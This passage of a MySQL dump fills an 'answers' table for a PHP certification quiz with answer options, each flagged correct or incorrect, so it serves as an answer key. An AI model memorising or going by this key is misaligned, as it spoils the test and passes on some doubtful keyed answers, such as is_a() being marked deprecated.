# ************************************************************
# Sequel Pro SQL dump
# Version 3408
#
# http://www.sequelpro.com/
# http://code.google.com/p/sequel-pro/
#
# Host: localhost (MySQL 5.5.27)
# Database: certification
# Generation Time: 2012-11-24 18:24:48 +0000
# ************************************************************


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


# Dump of table answers
# ------------------------------------------------------------

DROP TABLE IF EXISTS `answers`;

CREATE TABLE `answers` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `question_id` int(10) unsigned NOT NULL,
  `content` text NOT NULL,
  `correct` tinyint(1) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `answers_question_id_foreign` (`question_id`),
  CONSTRAINT `answers_question_id_foreign` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `answers` WRITE;
/*!40000 ALTER TABLE `answers` DISABLE KEYS */;

INSERT INTO `answers` (`id`, `question_id`, `content`, `correct`, `created_at`, `updated_at`)
VALUES
	(25,2,'<p><span>!==</span></p>',1,'2012-11-18 17:39:53','2012-11-18 17:39:53'),
	(26,2,'<p>===</p>',0,'2012-11-18 17:39:53','2012-11-18 17:39:53'),
	(27,2,'<p>!=</p>',0,'2012-11-18 17:39:53','2012-11-18 17:39:53'),
	(28,2,'<p>==</p>',0,'2012-11-18 17:39:53','2012-11-18 17:39:53'),
	(29,5,'<p><span>You can use print() as part of an expression while you cannot use echo().</span></p>',1,'2012-11-18 17:41:17','2012-11-18 17:41:17'),
	(30,5,'<p><span>You can use print() to print numbers while you cannot use echo for this.</span></p>',0,'2012-11-18 17:41:17','2012-11-18 17:41:17'),
	(31,5,'<p><span>You cannot use echo() with bitwise operators but you can use print() for this.</span></p>',0,'2012-11-18 17:41:17','2012-11-18 17:41:17'),
	(32,5,'<p><span>There is no difference between echo() and print() functions.</span></p>',0,'2012-11-18 17:41:17','2012-11-18 17:41:17'),
	(33,6,'<p><span>It evaluates to true if the two operands are equivalent.</span></p>',0,'2012-11-18 17:42:57','2012-11-18 17:42:57'),
	(34,6,'<p><span>It evaluates to true only if the operands are of the same data type and have the same value.</span></p>',1,'2012-11-18 17:42:57','2012-11-18 17:42:57'),
	(35,6,'<p><span>If the two values are strings, it performs a lexical comparison.</span></p>',0,'2012-11-18 17:42:57','2012-11-18 17:42:57'),
	(36,6,'<p><span>It is an alias of strcmp() function.</span></p>',0,'2012-11-18 17:42:57','2012-11-18 17:42:57'),
	(37,7,'<p><span>Array</span></p>',1,'2012-11-18 17:44:36','2012-11-18 17:44:36'),
	(38,7,'<p><span>Objects</span></p>',1,'2012-11-18 17:44:36','2012-11-18 17:44:36'),
	(39,7,'<p><span>Booleans</span></p>',0,'2012-11-18 17:44:36','2012-11-18 17:44:36'),
	(40,7,'<p><span>Strings</span></p>',0,'2012-11-18 17:44:36','2012-11-18 17:44:36'),
	(176,1,'<p>ASP tag</p>',0,'2012-11-18 20:15:54','2012-11-18 20:15:54'),
	(177,1,'<p><span>Script tag</span></p>',0,'2012-11-18 20:15:54','2012-11-18 20:15:54'),
	(178,1,'<p><span>Short tag</span></p>',0,'2012-11-18 20:15:54','2012-11-18 20:15:54'),
	(179,1,'<p>Standard Tag</p>',1,'2012-11-18 20:15:54','2012-11-18 20:15:54'),
	(180,4,'<p>8</p>',0,'2012-11-18 20:16:51','2012-11-18 20:16:51'),
	(181,4,'<p>7</p>',1,'2012-11-18 20:16:51','2012-11-18 20:16:51'),
	(182,4,'<p>10</p>',0,'2012-11-18 20:16:52','2012-11-18 20:16:52'),
	(183,4,'<p><span>The PHP script will return an error message.</span></p>',0,'2012-11-18 20:16:52','2012-11-18 20:16:52'),
	(184,8,'<p><span>Array ( [0] =&gt; 3 [1] =&gt; 4 [2] =&gt; 8 )</span></p>',1,'2012-11-18 20:19:05','2012-11-18 20:19:05'),
	(185,8,'<p><span>Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 )</span></p>',0,'2012-11-18 20:19:05','2012-11-18 20:19:05'),
	(186,8,'<p><span>Array ( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 6 )</span></p>',0,'2012-11-18 20:19:05','2012-11-18 20:19:05'),
	(187,8,'<p><span>Array ( [0] =&gt; 5 [1] =&gt; 7 [2] =&gt; 9 )</span></p>',0,'2012-11-18 20:19:05','2012-11-18 20:19:05'),
	(196,3,'<p>154</p>',0,'2012-11-18 20:22:58','2012-11-18 20:22:58'),
	(197,3,'<p>74</p>',1,'2012-11-18 20:22:58','2012-11-18 20:22:58'),
	(198,3,'<p>26</p>',0,'2012-11-18 20:22:58','2012-11-18 20:22:58'),
	(199,3,'<p>130</p>',0,'2012-11-18 20:22:58','2012-11-18 20:22:58'),
	(204,10,'<p><span>A series from 1 to 50 will be printed.</span></p>',0,'2012-11-18 20:24:13','2012-11-18 20:24:13'),
	(205,10,'<p><span>A series from 1 to 100 will be printed. The number 50 will not be printed.</span></p>',1,'2012-11-18 20:24:13','2012-11-18 20:24:13'),
	(206,10,'<p><span>A series from 1 to 100 will be printed.</span></p>',0,'2012-11-18 20:24:13','2012-11-18 20:24:13'),
	(207,10,'<p><span>A series from 51 to 100 will be printed.</span></p>',0,'2012-11-18 20:24:13','2012-11-18 20:24:13'),
	(208,9,'<p>7</p>',0,'2012-11-18 20:27:24','2012-11-18 20:27:24'),
	(209,9,'<p>8</p>',0,'2012-11-18 20:27:24','2012-11-18 20:27:24'),
	(210,9,'<p>9</p>',0,'2012-11-18 20:27:24','2012-11-18 20:27:24'),
	(211,9,'<p>10</p>',1,'2012-11-18 20:27:24','2012-11-18 20:27:24'),
	(212,11,'<p>0</p>',0,'2012-11-18 20:33:20','2012-11-18 20:33:20'),
	(213,11,'<p>25</p>',1,'2012-11-18 20:33:20','2012-11-18 20:33:20'),
	(214,11,'<p>10</p>',0,'2012-11-18 20:33:20','2012-11-18 20:33:20'),
	(215,11,'<p><span>The script will throw an error message.</span></p>',0,'2012-11-18 20:33:20','2012-11-18 20:33:20'),
	(216,12,'<p><span>Book Details</span></p>',0,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(217,12,'<p><span>Book Author</span></p>',0,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(218,12,'<p><span>Missing Book</span></p>',0,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(219,12,'<p><span>It will display all the three lines.</span></p>',1,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(220,12,'<p><span>The script will throw an error.</span></p>',0,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(221,13,'<p>Fast</p>',0,'2012-11-18 20:41:23','2012-11-18 20:41:23'),
	(222,13,'<p><span>FastTechdefault</span></p>',1,'2012-11-18 20:41:23','2012-11-18 20:41:23'),
	(223,13,'<p><span>Fast Tech</span></p>',0,'2012-11-18 20:41:23','2012-11-18 20:41:23'),
	(224,13,'<p><span>default</span></p>',0,'2012-11-18 20:41:23','2012-11-18 20:41:23'),
	(225,14,'<p><span>true</span></p>',1,'2012-11-18 20:44:28','2012-11-18 20:44:28'),
	(226,14,'<p>true</p>',0,'2012-11-18 20:44:28','2012-11-18 20:44:28'),
	(227,14,'<p><span>true false</span></p>',0,'2012-11-18 20:44:28','2012-11-18 20:44:28'),
	(228,14,'<p><span>The script will throw an error message.</span></p>',0,'2012-11-18 20:44:28','2012-11-18 20:44:28'),
	(229,15,'<p><span>x = 1 y = 1</span></p>',0,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(230,15,'<p><span>x = 1 y = 2</span></p>',1,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(231,15,'<p><span>x = 1 y = 3</span></p>',1,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(232,15,'<p><span>x = 2 y = 1</span></p>',1,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(233,15,'<p><span>x = 2 y = 2</span></p>',0,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(234,16,'<p><span>For loop</span></p>',0,'2012-11-18 20:51:31','2012-11-18 20:51:31'),
	(235,16,'<p><span>While loop</span></p>',0,'2012-11-18 20:51:31','2012-11-18 20:51:31'),
	(236,16,'<p><span>Do while loop</span></p>',0,'2012-11-18 20:51:31','2012-11-18 20:51:31'),
	(237,16,'<p><span>For each loop</span></p>',1,'2012-11-18 20:51:31','2012-11-18 20:51:31'),
	(238,17,'<p><span>12365</span></p>',0,'2012-11-18 20:53:18','2012-11-18 20:53:18'),
	(239,17,'<p>0</p>',0,'2012-11-18 20:53:18','2012-11-18 20:53:18'),
	(240,17,'<p><span>14345</span></p>',0,'2012-11-18 20:53:18','2012-11-18 20:53:18'),
	(241,17,'<p>-1</p>',1,'2012-11-18 20:53:18','2012-11-18 20:53:18'),
	(242,18,'<p><span>-1 and warning</span></p>',1,'2012-11-18 20:55:29','2012-11-18 20:55:29'),
	(243,18,'<p><span>Jan-01-1966</span></p>',0,'2012-11-18 20:55:29','2012-11-18 20:55:29'),
	(244,18,'<p><span>Jan-01-1964</span></p>',0,'2012-11-18 20:55:29','2012-11-18 20:55:29'),
	(245,18,'<p><span>Date out of range error</span></p>',0,'2012-11-18 20:55:29','2012-11-18 20:55:29'),
	(246,19,'<p>-1</p>',1,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(247,19,'<p><span>fatal error</span></p>',0,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(248,19,'<p>1</p>',0,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(249,19,'<p>0</p>',0,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(250,19,'<p>1970</p>',0,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(251,20,'<p><span>date()</span></p>',0,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(252,20,'<p><span>time()</span></p>',1,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(253,20,'<p><span>strtotime()</span></p>',1,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(254,20,'<p><span>localtime()</span></p>',0,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(255,20,'<p>now()</p>',0,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(256,21,'<p>10</p>',0,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(257,21,'<p>9</p>',0,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(258,21,'<p>11</p>',1,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(259,21,'<p>8</p>',0,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(260,21,'<p><span>The script will throw an error message.</span></p>',0,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(261,22,'<p>0</p>',1,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(262,22,'<p>20</p>',0,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(263,22,'<p>4</p>',0,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(264,22,'<p>5</p>',0,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(265,22,'<p>40</p>',0,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(271,23,'<p><span>51 birds sit on 18 trees.</span></p>',1,'2012-11-18 21:08:21','2012-11-18 21:08:21'),
	(272,23,'<p><span>51 birds sit on 22 trees.</span></p>',0,'2012-11-18 21:08:21','2012-11-18 21:08:21'),
	(273,23,'<p><span>51 birds sit on 0 trees.</span></p>',0,'2012-11-18 21:08:21','2012-11-18 21:08:21'),
	(274,23,'<p><span>51 birds sit on trees.</span></p>',0,'2012-11-18 21:08:21','2012-11-18 21:08:21'),
	(275,23,'<p><span>18 birds sit on 51 trees.</span></p>',0,'2012-11-18 21:08:21','2012-11-18 21:08:21'),
	(276,24,'<p>5</p>',0,'2012-11-18 21:10:18','2012-11-18 21:10:18'),
	(277,24,'<p>10</p>',1,'2012-11-18 21:10:18','2012-11-18 21:10:18'),
	(278,24,'<p>2</p>',0,'2012-11-18 21:10:18','2012-11-18 21:10:18'),
	(279,24,'<p><span>The script will throw an error message.</span></p>',0,'2012-11-18 21:10:18','2012-11-18 21:10:18'),
	(280,25,'<p><span>Fatal error</span></p>',1,'2012-11-18 21:12:08','2012-11-18 21:12:08'),
	(281,25,'<p><span>Warning</span></p>',0,'2012-11-18 21:12:08','2012-11-18 21:12:08'),
	(282,25,'<p><span>Notice</span></p>',0,'2012-11-18 21:12:08','2012-11-18 21:12:08'),
	(283,25,'<p><span>Compile-time error</span></p>',0,'2012-11-18 21:12:08','2012-11-18 21:12:08'),
	(284,26,'<p><span>Jan-01-1996</span></p>',1,'2012-11-18 21:14:07','2012-11-18 21:14:07'),
	(285,26,'<p><span>Date out of range error</span></p>',0,'2012-11-18 21:14:07','2012-11-18 21:14:07'),
	(286,26,'<p><span>Fatal error</span></p>',0,'2012-11-18 21:14:07','2012-11-18 21:14:07'),
	(287,26,'<p><span>Jan-01-1995</span></p>',0,'2012-11-18 21:14:07','2012-11-18 21:14:07'),
	(288,27,'<p><span>php.ini</span></p>',1,'2012-11-18 21:15:09','2012-11-18 21:15:09'),
	(289,27,'<p><span>isset.ini</span></p>',0,'2012-11-18 21:15:09','2012-11-18 21:15:09'),
	(290,27,'<p><span>httpd_php.conf</span></p>',0,'2012-11-18 21:15:09','2012-11-18 21:15:09'),
	(291,27,'<p><span>config.ini</span></p>',0,'2012-11-18 21:15:09','2012-11-18 21:15:09'),
	(296,29,'<p><span>Arrays</span></p>',1,'2012-11-18 21:18:47','2012-11-18 21:18:47'),
	(297,29,'<p><span>Classes</span></p>',1,'2012-11-18 21:18:47','2012-11-18 21:18:47'),
	(298,29,'<p><span>Objects</span></p>',1,'2012-11-18 21:18:47','2012-11-18 21:18:47'),
	(299,29,'<p><span>PECL</span></p>',0,'2012-11-18 21:18:47','2012-11-18 21:18:47'),
	(300,30,'<p><span>Added heredoc and nowdoc support for class const and property definitions</span></p>',0,'2012-11-18 21:20:03','2012-11-18 21:20:03'),
	(301,30,'<p><span>Exceptions thrown in the __autoload function can be caught in the catch block</span></p>',0,'2012-11-18 21:20:03','2012-11-18 21:20:03'),
	(302,30,'<p><span>The __toString method is called in any string context</span></p>',0,'2012-11-18 21:20:03','2012-11-18 21:20:03'),
	(303,30,'<p><span>Classes that implement interfaces with methods that have default values in the prototype are required to match the interface\'s default value.</span></p>',1,'2012-11-18 21:20:03','2012-11-18 21:20:03'),
	(304,31,'<p><span>TRUE</span></p>',0,'2012-11-18 21:21:10','2012-11-18 21:21:10'),
	(305,31,'<p><span>FALSE</span></p>',1,'2012-11-18 21:21:10','2012-11-18 21:21:10'),
	(306,31,'<p><span>NULL</span></p>',0,'2012-11-18 21:21:10','2012-11-18 21:21:10'),
	(307,31,'<p>123</p>',0,'2012-11-18 21:21:10','2012-11-18 21:21:10'),
	(308,32,'<p><span>global, function and class</span></p>',1,'2012-11-18 21:22:45','2012-11-18 21:22:45'),
	(309,32,'<p><span>global, script and function</span></p>',0,'2012-11-18 21:22:45','2012-11-18 21:22:45'),
	(310,32,'<p><span>script, function and class</span></p>',0,'2012-11-18 21:22:45','2012-11-18 21:22:45'),
	(311,32,'<p><span>class, global and script</span></p>',0,'2012-11-18 21:22:45','2012-11-18 21:22:45'),
	(312,33,'<p><span>ereg()</span></p>',0,'2012-11-18 21:23:45','2012-11-18 21:23:45'),
	(313,33,'<p><span>split()</span></p>',0,'2012-11-18 21:23:45','2012-11-18 21:23:45'),
	(314,33,'<p><span>Call-time pass-by-reference</span></p>',0,'2012-11-18 21:23:45','2012-11-18 21:23:45'),
	(315,33,'<p><span>is_a()</span></p>',1,'2012-11-18 21:23:45','2012-11-18 21:23:45'),
	(316,34,'<p><span>$__var</span></p>',0,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(317,34,'<p><span>$2var</span></p>',1,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(318,34,'<p><span>$_2var</span></p>',0,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(319,34,'<p><span>$var</span></p>',0,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(320,34,'<p>$$$var</p>',0,'2012-11-18 21:25:20','2012-11-18 21:25:20'),
	(321,35,'<p><span>Boolean True</span></p>',1,'2012-11-18 21:27:12','2012-11-18 21:27:12'),
	(322,35,'<p><span>1</span></p>',0,'2012-11-18 21:27:12','2012-11-18 21:27:12'),
	(323,35,'<p><span>Boolean False</span></p>',0,'2012-11-18 21:27:12','2012-11-18 21:27:12'),
	(324,35,'<p><span>0</span></p>',0,'2012-11-18 21:27:12','2012-11-18 21:27:12'),
	(325,36,'<p><span>FOO</span></p>',0,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(326,36,'<p>100</p>',0,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(327,36,'<p>200</p>',1,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(328,36,'<p>20</p>',0,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(329,36,'<p>10</p>',0,'2012-11-18 21:29:56','2012-11-18 21:29:56'),
	(330,37,'<p><span>Loops infinitely.</span></p>',0,'2012-11-18 21:31:20','2012-11-18 21:31:20'),
	(331,37,'<p><span>Switches the values of $p and $q.</span></p>',0,'2012-11-18 21:31:20','2012-11-18 21:31:20'),
	(332,37,'<p><span>Determines if they are both even or odd.</span></p>',0,'2012-11-18 21:31:20','2012-11-18 21:31:20'),
	(333,37,'<p><span>Determines the greatest common divisor between them.</span></p>',1,'2012-11-18 21:31:20','2012-11-18 21:31:20'),
	(334,38,'<p>120</p>',1,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(335,38,'<p><span>Syntax Error</span></p>',0,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(336,38,'<p>200</p>',0,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(337,38,'<p>60</p>',0,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(338,38,'<p>70</p>',0,'2012-11-18 21:33:21','2012-11-18 21:33:21'),
	(339,39,'<p><span>Concept of void functions exists in PHP.</span></p>',1,'2012-11-18 21:35:07','2012-11-18 21:35:07'),
	(340,39,'<p><span>PHP can allow functions to return variables.</span></p>',0,'2012-11-18 21:35:07','2012-11-18 21:35:07'),
	(341,39,'<p><span>Functions in PHP cannot return expressions by reference.</span></p>',0,'2012-11-18 21:35:07','2012-11-18 21:35:07'),
	(342,39,'<p><span>Return value of a function can be specified by using return keyword.</span></p>',0,'2012-11-18 21:35:07','2012-11-18 21:35:07'),
	(343,40,'<p><span>true true false</span></p>',0,'2012-11-18 21:37:02','2012-11-18 21:37:02'),
	(344,40,'<p><span>true false true</span></p>',0,'2012-11-18 21:37:02','2012-11-18 21:37:02'),
	(345,40,'<p><span>true false false</span></p>',1,'2012-11-18 21:37:02','2012-11-18 21:37:02'),
	(346,40,'<p><span>false true true</span></p>',0,'2012-11-18 21:37:02','2012-11-18 21:37:02'),
	(347,41,'<p><span>It will cause the output of the UNIX ls command to be stored inside $a.</span></p>',1,'2012-11-18 21:38:31','2012-11-18 21:38:31'),
	(348,41,'<p><span>It will not give any result as ls -l is just a string enclosed under single quotes.</span></p>',0,'2012-11-18 21:38:31','2012-11-18 21:38:31'),
	(349,41,'<p><span>It will cause an error.</span></p>',0,'2012-11-18 21:38:31','2012-11-18 21:38:31'),
	(350,41,'<p><span>It will cause a warning message.</span></p>',0,'2012-11-18 21:38:31','2012-11-18 21:38:31'),
	(351,42,'<p><span>NOT</span></p>',1,'2012-11-18 21:39:56','2012-11-18 21:39:56'),
	(352,42,'<p><span>AND</span></p>',0,'2012-11-18 21:39:56','2012-11-18 21:39:56'),
	(353,42,'<p>OR</p>',0,'2012-11-18 21:39:56','2012-11-18 21:39:56'),
	(354,42,'<p>XOR</p>',0,'2012-11-18 21:39:56','2012-11-18 21:39:56'),
	(355,28,'<p>&lt;?php define(\"GREETING\",\"How are you today?\",TRUE); echo constant(\"greeting\"); ?&gt;</p>',1,'2012-11-18 21:46:38','2012-11-18 21:46:38'),
	(356,28,'<p>&lt;?php define(\"GREETING\",\"How are you today?\"); echo constant(\"greeting\"); ?&gt;</p>',0,'2012-11-18 21:46:38','2012-11-18 21:46:38'),
	(357,28,'<p>&lt;?php define(\"GREETING\",\"How are you today?\",FALSE); echo constant(\"greeting\"); ?&gt;</p>',0,'2012-11-18 21:46:38','2012-11-18 21:46:38'),
	(358,28,'<p>&lt;?php define(\"GREETING\",\"How are you today?\",\'USECASE\'); echo constant(\"greeting\"); ?&gt;</p>',0,'2012-11-18 21:46:38','2012-11-18 21:46:38'),
	(359,43,'_sum($var1, $var2)',1,'2012-11-18 22:08:32','2012-11-18 22:08:32'),
	(360,43,'&sum($var1, $var2)',0,'2012-11-18 22:08:32','2012-11-18 22:08:32'),
	(361,43,'123_sum($var1,$var2)',0,'2012-11-18 22:08:32','2012-11-18 22:08:32'),
	(362,43,'^^_sum($var1, $var2)',0,'2012-11-18 22:08:32','2012-11-18 22:08:32'),
	(363,44,'func_get_args(2);',0,'2012-11-18 22:10:10','2012-11-18 22:10:10'),
	(364,44,'func_get_arg(1);',1,'2012-11-18 22:10:10','2012-11-18 22:10:10'),
	(365,44,'func_num_args(1);',0,'2012-11-18 22:10:10','2012-11-18 22:10:10'),
	(366,44,'func_num_args(2);',0,'2012-11-18 22:10:10','2012-11-18 22:10:10'),
	(367,45,'array(\'a\', \'b\', 1, 2)',0,'2012-11-18 22:13:10','2012-11-18 22:13:10'),
	(368,45,'array(1, 2, \'a\', \'b\')',0,'2012-11-18 22:13:10','2012-11-18 22:13:10'),
	(369,45,'array(array(1, 2), \'a\', \'b\')',0,'2012-11-18 22:13:10','2012-11-18 22:13:10'),
	(370,45,'array(\'a\', \'b\', array(1, 2))',1,'2012-11-18 22:13:10','2012-11-18 22:13:10'),
	(371,46,'<?php $foo = create_function(\'$x\', \'return $x*$x;\'); echo $foo(10); ?>',1,'2012-11-18 22:15:49','2012-11-18 22:15:49'),
	(372,46,'<?php $foo = create_function(\"\\$x\", \"return \\$x*\\$x;\"); echo $foo(10); ?>',1,'2012-11-18 22:15:49','2012-11-18 22:15:49'),
	(373,46,'<?php $foo = create_function(\"$x\", \"return $x*$x;\"); echo $foo(10); ?>',0,'2012-11-18 22:15:49','2012-11-18 22:15:49'),
	(374,46,'<?php $foo = create_function(\"$x\", \"$x*$x;\"); echo $foo(10); ?>',0,'2012-11-18 22:15:49','2012-11-18 22:15:49'),
	(375,47,'50',1,'2012-11-18 22:17:25','2012-11-18 22:17:25'),
	(376,47,'10',0,'2012-11-18 22:17:25','2012-11-18 22:17:25'),
	(377,47,'Script will throw an error.',0,'2012-11-18 22:17:25','2012-11-18 22:17:25'),
	(378,47,'0',0,'2012-11-18 22:17:25','2012-11-18 22:17:25'),
	(379,48,'You can return any type of value including arrays and objects.',1,'2012-11-18 22:24:25','2012-11-18 22:24:25'),
	(380,48,'The return statement does not halt the functions execution and passes control back to the line from which the function was called.',0,'2012-11-18 22:24:25','2012-11-18 22:24:25'),
	(381,48,'The return statement does not return string values and Boolean values.\r\n',0,'2012-11-18 22:24:25','2012-11-18 22:24:25'),
	(382,48,'The return statement does not work with anonymous functions.\r\n',0,'2012-11-18 22:24:25','2012-11-18 22:24:25'),
	(383,49,'global $a, $b; $b = $a * $b;',1,'2012-11-18 22:27:19','2012-11-18 22:27:19'),
	(384,49,'$GLOBALS[\'b\'] = $GLOBALS[\'a\'] * $GLOBALS[\'b\'];',1,'2012-11-18 22:27:19','2012-11-18 22:27:19'),
	(385,49,'$b = $a * $b;',0,'2012-11-18 22:27:19','2012-11-18 22:27:19'),
	(386,49,'globals($b = $a * $b);',0,'2012-11-18 22:27:19','2012-11-18 22:27:19'),
	(387,50,'natsort()',1,'2012-11-18 22:31:06','2012-11-18 22:31:06'),
	(388,50,'ksort()',0,'2012-11-18 22:31:06','2012-11-18 22:31:06'),
	(389,50,'sort()',0,'2012-11-18 22:31:06','2012-11-18 22:31:06'),
	(390,50,'asort()',0,'2012-11-18 22:31:06','2012-11-18 22:31:06'),
	(391,51,'50',0,'2012-11-18 22:32:14','2012-11-18 22:32:14'),
	(392,51,'10',1,'2012-11-18 22:32:14','2012-11-18 22:32:14'),
	(393,51,'0',0,'2012-11-18 22:32:14','2012-11-18 22:32:14'),
	(394,51,'The script will return an error message.',0,'2012-11-18 22:32:14','2012-11-18 22:32:14'),
	(395,52,'print $a[\'widely used\'][\'originally\'][10];',1,'2012-11-18 22:33:38','2012-11-18 22:33:38'),
	(396,52,'print $a[\'widely used\'][\'originally\'][0];',0,'2012-11-18 22:33:38','2012-11-18 22:33:38'),
	(397,52,'print $a[2][3][3];',0,'2012-11-18 22:33:38','2012-11-18 22:33:38'),
	(398,52,'print $a[widely used][originally][3];',0,'2012-11-18 22:33:38','2012-11-18 22:33:38'),
	(399,53,'Array ( [0] => 1 [1] => 2 [2] => 3 )',1,'2012-11-18 22:35:18','2012-11-18 22:35:18'),
	(400,53,'Array ( [0] => 4 [1] => 8 [2] => 12 )',0,'2012-11-18 22:35:18','2012-11-18 22:35:18'),
	(401,53,'Array ( [0] => 1 [4] => 2 [8] => 3 )',0,'2012-11-18 22:35:18','2012-11-18 22:35:18'),
	(402,53,'The script will throw an error message.',0,'2012-11-18 22:35:18','2012-11-18 22:35:18'),
	(403,54,'Array ([1] => a [2] => b)',0,'2012-11-18 22:36:18','2012-11-18 22:36:18'),
	(404,54,'bool(true)',0,'2012-11-18 22:36:18','2012-11-18 22:36:18'),
	(405,54,'It will show a blank screen.',1,'2012-11-18 22:36:18','2012-11-18 22:36:18'),
	(406,54,'It will show an error message.',1,'2012-11-18 22:36:18','2012-11-18 22:36:18'),
	(407,55,'1',1,'2012-11-18 22:37:16','2012-11-18 22:37:16'),
	(408,55,'2',0,'2012-11-18 22:37:16','2012-11-18 22:37:16'),
	(409,55,'0',0,'2012-11-18 22:37:16','2012-11-18 22:37:16'),
	(410,55,'The script will throw an error message.',0,'2012-11-18 22:37:16','2012-11-18 22:37:16'),
	(411,56,'Array ( [0] => orange [1] => green [2] => yellow [3] => white [4] => blue )',1,'2012-11-18 22:38:53','2012-11-18 22:38:53'),
	(412,56,'Array ( [0] => blue [1] => white [2] => yellow [3] => green [4] => orange )',0,'2012-11-18 22:38:53','2012-11-18 22:38:53'),
	(413,56,'Array ( [0] => yellow [1] => white [2] => blue [3] => green [4] => orange )',0,'2012-11-18 22:38:53','2012-11-18 22:38:53'),
	(414,56,'Script will throw an error message.',0,'2012-11-18 22:38:53','2012-11-18 22:38:53'),
	(415,57,'ArrayObject::STD_PROP_LIST',1,'2012-11-18 22:40:05','2012-11-18 22:40:05'),
	(416,57,'stdClass:: STD_PROP_LIST',0,'2012-11-18 22:40:05','2012-11-18 22:40:05'),
	(417,57,'ArrayObject::PROP_LIST',0,'2012-11-18 22:40:05','2012-11-18 22:40:05'),
	(418,57,'stdClass::PROP_LIST',0,'2012-11-18 22:40:05','2012-11-18 22:40:05'),
	(419,58,'ArrayObject::keysort',0,'2012-11-18 22:41:14','2012-11-18 22:41:14'),
	(420,58,'ArrayObject::asort',1,'2012-11-18 22:41:14','2012-11-18 22:41:14'),
	(421,58,'ArrayObject::sort',0,'2012-11-18 22:41:14','2012-11-18 22:41:14'),
	(422,58,'ArrayObject::rsort',0,'2012-11-18 22:41:14','2012-11-18 22:41:14'),
	(423,59,'1',0,'2012-11-18 22:42:08','2012-11-18 22:42:08'),
	(424,59,'2',1,'2012-11-18 22:42:08','2012-11-18 22:42:08'),
	(425,59,'3',0,'2012-11-18 22:42:08','2012-11-18 22:42:08'),
	(426,59,'4',0,'2012-11-18 22:42:08','2012-11-18 22:42:08'),
	(427,60,'a2 = e a1 = x a3 = z',1,'2012-11-18 22:43:50','2012-11-18 22:43:50'),
	(428,60,'a1 = e a2 = x a3 = z',0,'2012-11-18 22:43:50','2012-11-18 22:43:50'),
	(429,60,'0 = e 1 =x 2 = z',0,'2012-11-18 22:43:50','2012-11-18 22:43:50'),
	(430,60,'The script will throw an error message.',0,'2012-11-18 22:43:50','2012-11-18 22:43:50'),
	(431,61,'a1 = x a2 = e a3 = z',1,'2012-11-18 22:45:34','2012-11-18 22:45:34'),
	(432,61,'a1 = e a2 = x a3 = z',0,'2012-11-18 22:45:34','2012-11-18 22:45:34'),
	(433,61,'0 = e 1 = x 2 = z',0,'2012-11-18 22:45:34','2012-11-18 22:45:34'),
	(434,61,'The script will throw an error message.',0,'2012-11-18 22:45:34','2012-11-18 22:45:34'),
	(435,62,'The key of the array will be sorted and the elements will not be sorted, however, they will be preserved.',0,'2012-11-18 22:46:58','2012-11-18 22:46:58'),
	(436,62,'The elements of the array will be sorted and the keys will not be sorted, however, they will be preserved.',0,'2012-11-18 22:46:58','2012-11-18 22:46:58'),
	(437,62,'The elements of the array will be sorted and keys will not be preserved.',1,'2012-11-18 22:46:58','2012-11-18 22:46:58'),
